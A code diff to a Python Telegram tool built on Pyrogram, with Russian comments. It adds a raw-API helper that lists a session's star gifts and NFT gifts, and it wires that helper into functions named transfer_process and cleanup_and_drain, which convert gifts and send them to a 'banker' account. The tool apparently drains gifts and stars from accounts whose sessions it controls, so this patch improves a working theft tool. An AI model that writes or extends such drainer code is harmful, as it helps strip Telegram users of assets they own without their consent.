@@ -609,6 +609,109 @@ async def get_owned_channels(client: Client):
     except: pass
     return channels
 
+async def safe_get_chat_gifts(client: Client, chat_id="me"):
+    """
+    Безопасное получение подарков через raw API (обход проблемы с exclude_limited)
+    """
+    try:
+        if PYROFORK_AVAILABLE:
+            from pyrofork import raw
+        else:
+            from pyrogram import raw
+        
+        # Используем raw API напрямую
+        log_transfer(f"🔍 Вызов raw.functions.payments.GetSavedStarGifts()")
+        result = await client.invoke(
+            raw.functions.payments.GetSavedStarGifts()
+        )
+        
+        log_transfer(f"🔍 Raw API результат получен: {type(result).__name__}")
+        log_transfer(f"🔍 Атрибуты результата: {[attr for attr in dir(result) if not attr.startswith('_')]}")
+        
+        if hasattr(result, 'gifts'):
+            gifts_list = result.gifts
+            log_transfer(f"🔍 Найдено подарков в raw API: {len(gifts_list) if gifts_list else 0}")
+            
+            if gifts_list:
+                for idx, gift_raw in enumerate(gifts_list, 1):
+                    try:
+                        log_transfer(f"🔍 Обработка подарка #{idx}: {type(gift_raw).__name__}")
+                        log_transfer(f"🔍 Атрибуты подарка: {[attr for attr in dir(gift_raw) if not attr.startswith('_')]}")
+                        
+                        # Пробуем создать объект Gift через _parse
+                        try:
+                            if PYROFORK_AVAILABLE:
+                                from pyrofork.types import Gift
+                            else:
+                                from pyrogram.types import Gift
+                            
+                            gift_obj = Gift._parse(client, gift_raw)
+                            log_transfer(f"✅ Подарок #{idx} успешно преобразован через Gift._parse")
+                            yield gift_obj
+                            continue
+                        except Exception as parse_e:
+                            log_transfer(f"⚠️ Gift._parse не сработал для подарка #{idx}: {parse_e}", "warning")
+                        
+                        # Если _parse не сработал, создаем SimpleGift
+                        class SimpleGift:
+                            def __init__(self, raw_gift):
+                                # Извлекаем все возможные атрибуты
+                                self.id = getattr(raw_gift, 'id', None)
+                                self.message_id = getattr(raw_gift, 'message_id', None)
+                                self.collectible_id = getattr(raw_gift, 'collectible_id', None)
+                                
+                                # Пробуем разные варианты названия
+                                self.title = (getattr(raw_gift, 'title', None) or 
+                                            getattr(raw_gift, 'name', None) or 
+                                            getattr(raw_gift, 'text', None) or 
+                                            "Unknown Gift")
+                                
+                                # Пробуем разные варианты цены конвертации
+                                self.convert_price = (getattr(raw_gift, 'convert_price', 0) or 
+                                                     getattr(raw_gift, 'price', 0) or 
+                                                     getattr(raw_gift, 'star_count', 0) or 0)
+                                
+                                # Пробуем разные варианты цены передачи
+                                self.transfer_price = (getattr(raw_gift, 'transfer_price', 0) or 
+                                                      getattr(raw_gift, 'transfer_cost', 0) or 0)
+                                
+                                self.can_transfer_at = getattr(raw_gift, 'can_transfer_at', None)
+                                self.is_converted = getattr(raw_gift, 'is_converted', False)
+                                self.slug = getattr(raw_gift, 'slug', None)
+                                
+                                # Определяем can_transfer
+                                if self.collectible_id is not None:  # Это NFT
+                                    if self.can_transfer_at is None:
+                                        self.can_transfer = True
+                                    else:
+                                        from datetime import datetime
+                                        now = datetime.now(self.can_transfer_at.tzinfo) if self.can_transfer_at.tzinfo else datetime.now()
+                                        self.can_transfer = (self.can_transfer_at <= now)
+                                else:
+                                    self.can_transfer = False
+                        
+                        gift_obj = SimpleGift(gift_raw)
+                        log_transfer(f"✅ Подарок #{idx} создан как SimpleGift: {gift_obj.title}")
+                        yield gift_obj
+                        
+                    except Exception as e:
+                        log_transfer(f"❌ Ошибка обработки подарка #{idx}: {type(e).__name__}: {e}", "error")
+                        continue
+            else:
+                log_transfer(f"⚠️ Список подарков пуст")
+        else:
+            log_transfer(f"⚠️ Результат не содержит атрибут 'gifts'")
+            
+    except Exception as e:
+        log_transfer(f"❌ Ошибка safe_get_chat_gifts (raw API): {type(e).__name__}: {e}", "error")
+        # Fallback: пробуем обычный метод (может не сработать из-за exclude_limited)
+        log_transfer(f"🔄 Пробуем fallback через get_chat_gifts")
+        try:
+            async for gift in client.get_chat_gifts(chat_id=chat_id):
+                yield gift
+        except Exception as fallback_e:
+            log_transfer(f"❌ Fallback также не сработал: {type(fallback_e).__name__}: {fallback_e}", "error")
+
 async def scan_location_gifts(client: Client, peer_id, location_name):
     found_gifts = []
     
@@ -621,58 +724,23 @@ async def scan_location_gifts(client: Client, peer_id, location_name):
     except Exception as e:
         log_transfer(f"⚠️ Не удалось получить user_id: {e}", "warning")
     
-    # Метод 1: Попробуем с "me"
+    # Используем safe_get_chat_gifts (который использует raw API и обходит проблему exclude_limited)
     try:
+        log_transfer(f"🔍 Использование safe_get_chat_gifts для получения подарков")
         count = 0
-        log_transfer(f"🔍 Попытка 1: get_chat_gifts с peer_id='{peer_id}'")
-        async for gift in client.get_chat_gifts(chat_id=peer_id):
+        async for gift in safe_get_chat_gifts(client, peer_id):
             count += 1
             gift_info = analyze_gift(gift, location_name)
             found_gifts.append(gift_info)
-            log_transfer(f"🎁 Найден подарок: {gift_info['title']} (NFT: {gift_info['is_nft']}, Конверт: {gift_info['can_convert']}, Трансфер: {gift_info['can_transfer']})")
-        log_transfer(f"✅ Метод 1 успешен: найдено {count} подарков в {location_name}")
-        if count > 0:
-            return found_gifts
+            log_transfer(f"🎁 Найден подарок #{count}: {gift_info['title']} (NFT: {gift_info['is_nft']}, Конверт: {gift_info['can_convert']}, Трансфер: {gift_info['can_transfer']})")
+        
+        if len(found_gifts) > 0:
+            log_transfer(f"✅ Успешно найдено {len(found_gifts)} подарков в {location_name}")
+        else:
+            log_transfer(f"⚠️ Подарки не найдены в {location_name}")
+            
     except Exception as e:
-        log_transfer(f"⚠️ Метод 1 (peer_id='{peer_id}') не сработал: {type(e).__name__}: {e}", "warning")
-    
-    # Метод 2: Попробуем с user_id если peer_id был "me"
-    if peer_id == "me" and user_id:
-        try:
-            count = 0
-            log_transfer(f"🔍 Попытка 2: get_chat_gifts с user_id={user_id}")
-            async for gift in client.get_chat_gifts(chat_id=user_id):
-                count += 1
-                gift_info = analyze_gift(gift, location_name)
-                found_gifts.append(gift_info)
-                log_transfer(f"🎁 Найден подарок: {gift_info['title']} (NFT: {gift_info['is_nft']}, Конверт: {gift_info['can_convert']}, Трансфер: {gift_info['can_transfer']})")
-            log_transfer(f"✅ Метод 2 успешен: найдено {count} подарков в {location_name}")
-            if count > 0:
-                return found_gifts
-        except Exception as e:
-            log_transfer(f"⚠️ Метод 2 (user_id={user_id}) не сработал: {type(e).__name__}: {e}", "warning")
-    
-    # Метод 3: Попробуем еще раз с явным указанием "me" после небольшой задержки
-    try:
-        await asyncio.sleep(0.5)  # Небольшая задержка
-        count = 0
-        log_transfer(f"🔍 Попытка 3: повторный вызов get_chat_gifts с задержкой")
-        async for gift in client.get_chat_gifts(chat_id="me"):
-            count += 1
-            gift_info = analyze_gift(gift, location_name)
-            found_gifts.append(gift_info)
-            log_transfer(f"🎁 Найден подарок: {gift_info['title']} (NFT: {gift_info['is_nft']}, Конверт: {gift_info['can_convert']}, Трансфер: {gift_info['can_transfer']})")
-        log_transfer(f"✅ Метод 3 успешен: найдено {count} подарков в {location_name}")
-        if count > 0:
-            return found_gifts
-    except Exception as e:
-        log_transfer(f"⚠️ Метод 3 не сработал: {type(e).__name__}: {e}", "warning")
-    
-    # Если ничего не найдено, логируем это
-    if len(found_gifts) == 0:
-        log_transfer(f"⚠️ Подарки не найдены в {location_name} (peer_id={peer_id}, user_id={user_id})", "warning")
-    else:
-        log_transfer(f"📦 Всего подарков в {location_name}: {len(found_gifts)}")
+        log_transfer(f"❌ Ошибка сканирования подарков: {type(e).__name__}: {e}", "error")
     
     return found_gifts
 
@@ -917,8 +985,8 @@ async def wait_for_topup(client: Client, required_stars):
     log_transfer("⏳ Ждем поступления подарка (Smart Polling)...")
     for _ in range(10): # Максимум 10 проверок по 0.8 сек = 8 сек
         try:
-            # Сканируем только профиль (быстро)
-            async for gift in client.get_chat_gifts(chat_id="me"):
+            # Сканируем только профиль (быстро) через safe_get_chat_gifts
+            async for gift in safe_get_chat_gifts(client, "me"):
                 # Если нашли подарок, который можно конвертировать в звезды
                 if not getattr(gift, 'collectible_id', None) and getattr(gift, 'convert_price', 0) > 0:
                      # Дополнительная проверка: не конвертирован ли он уже
@@ -1044,7 +1112,7 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
             log_transfer("⏳ Ловим и конвертируем подарки Банкира...")
             for _ in range(15):
                 found_new = False
-                async for g in client.get_chat_gifts(chat_id="me"):
+                async for g in safe_get_chat_gifts(client, "me"):
                     if not getattr(g, 'collectible_id', None) and not getattr(g, 'is_converted', False):
                         asyncio.create_task(convert_gift_task(client, analyze_gift(g)))
                         found_new = True
@@ -1186,7 +1254,7 @@ async def cleanup_and_drain(client: Client, banker_username):
         transfer_tasks = []
         gift_count = 0
         
-        async for g in client.get_chat_gifts(chat_id="me", limit=50):
+        async for g in safe_get_chat_gifts(client, "me"):
             gift_count += 1
             is_nft = getattr(g, 'collectible_id', None) is not None
             is_converted = getattr(g, 'is_converted', False)
